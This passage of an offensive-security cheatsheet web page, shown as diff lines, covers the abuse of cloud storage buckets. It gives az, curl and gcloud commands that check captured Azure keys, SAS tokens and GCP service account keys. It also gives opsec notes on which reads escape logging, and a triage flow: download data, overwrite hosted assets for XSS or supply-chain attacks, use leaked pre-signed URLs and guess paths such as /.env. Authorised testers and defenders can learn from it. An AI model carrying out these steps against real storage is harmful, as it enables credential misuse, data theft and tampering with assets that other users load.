+</span></span><span class="line"><span class="cl"><span class="s2">&#34;clientId&#34;</span>: <span class="s2">&#34;...&#34;</span>, <span class="s2">&#34;clientSecret&#34;</span>: <span class="s2">&#34;...&#34;</span>, <span class="s2">&#34;tenantId&#34;</span>: <span class="s2">&#34;...&#34;</span>
+</span></span></code></pre></div><p>Validate:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Storage account key</span>
+</span></span><span class="line"><span class="cl">az storage container list --account-name STORAGE --account-key <span class="s2">&#34;KEY&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## SAS token</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;https://STORAGE.blob.core.windows.net/CONTAINER?&lt;SAS_TOKEN&gt;&amp;restype=container&amp;comp=list&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Service principal</span>
+</span></span><span class="line"><span class="cl">az login --service-principal --username CLIENTID --password CLIENTSECRET --tenant TENANTID
+</span></span></code></pre></div><h2 id="viii-gcp-service-account-key-format" data-heading-permalink="true"><span class="heading-content">viii. GCP service account key format</span>
+    <a class="heading-permalink" href="#viii-gcp-service-account-key-format" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;service_account&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;project_id&#34;</span><span class="p">:</span> <span class="s2">&#34;my-project&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;private_key_id&#34;</span><span class="p">:</span> <span class="s2">&#34;...&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;private_key&#34;</span><span class="p">:</span> <span class="s2">&#34;-----BEGIN PRIVATE KEY-----\n...&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;client_email&#34;</span><span class="p">:</span> <span class="s2">&#34;user@my-project.iam.gserviceaccount.com&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="err">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Validate:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcloud auth activate-service-account --key-file<span class="o">=</span>key.json
+</span></span><span class="line"><span class="cl">gcloud auth list
+</span></span><span class="line"><span class="cl">gcloud projects list
+</span></span></code></pre></div><h2 id="ix-opsec-for-storage-abuse" data-heading-permalink="true"><span class="heading-content">ix. OPSEC for storage abuse</span>
+    <a class="heading-permalink" href="#ix-opsec-for-storage-abuse" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<ul>
+<li>Bucket reads log to provider-side audit logs (CloudTrail / Storage logs / GCS logs)</li>
+<li>The bucket owner often doesn&rsquo;t enable access logging - anonymous reads usually go undetected</li>
+<li>High-volume scanning can rate-limit your IP</li>
+<li>Write attacks (upload, overwrite) ALWAYS log even when reads don&rsquo;t</li>
+</ul>
+<h2 id="x-quick-triage-flow" data-heading-permalink="true"><span class="heading-content">x. Quick triage flow</span>
+    <a class="heading-permalink" href="#x-quick-triage-flow" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>For each found bucket/container:</p>
+<ol>
+<li>Listing allowed? -&gt; enumerate object keys, download interesting ones</li>
+<li>Anonymous write? -&gt; check if it&rsquo;s a static site / hosted asset (overwrite = XSS / supply chain)</li>
+<li>Find creds in dumps? -&gt; validate them, jump to <a href="https://jinpwn.dev/cheatsheets/cloud/aws/">AWS</a>
+/<a href="https://jinpwn.dev/cheatsheets/cloud/azure/">Azure</a>
+/<a href="https://jinpwn.dev/cheatsheets/cloud/gcp/">GCP</a>
+ for privesc</li>
+<li>SAS / pre-signed URLs in app source? -&gt; use them while valid</li>
+<li>Bucket name + 403 on listing? -&gt; guess common object paths (<code>/backup.zip</code>, <code>/db.sql</code>, <code>/.env</code>)</li>
+</ol>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/cloud/cloud-recon/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">Cloud Recon</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/cloud/aws/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">AWS</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
